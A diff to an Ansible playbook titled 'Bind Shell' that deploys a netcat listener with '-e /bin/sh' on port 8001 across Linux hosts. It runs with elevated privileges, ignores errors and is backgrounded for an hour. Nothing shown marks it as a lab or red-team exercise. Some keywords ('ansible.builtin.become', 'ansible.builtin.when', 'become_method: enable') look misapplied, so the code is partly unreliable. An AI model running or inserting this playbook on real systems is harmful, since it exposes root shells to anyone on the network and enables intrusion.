@@ -1,10 +1,18 @@
-- name: bin shell
+- name: Bind Shell
   hosts: linux
   become: true
   become_method: enable
   ignore_errors: true
   tasks:
-    - name: bind shell
-      shell: "nc -lvp {{ bind_shell_port }} -e /bin/sh"
+    - name: Check Platform
+      ansible.builtin.become: false
+      ansible.builtin.command: "uname"
+      register: platform_info
+
+    - name: Bind Shell
+      ansible.builtin.command: "nc -lvp {{ bind_shell_port }} -e /bin/sh"
+      ansible.builtin.when: "'linux' in platform_info.stdout.lower()"
       vars:
         bind_shell_port: 8001
+      async: 3600  # Set an appropriate timeout in seconds
+      poll: 0     # Poll until the task completes
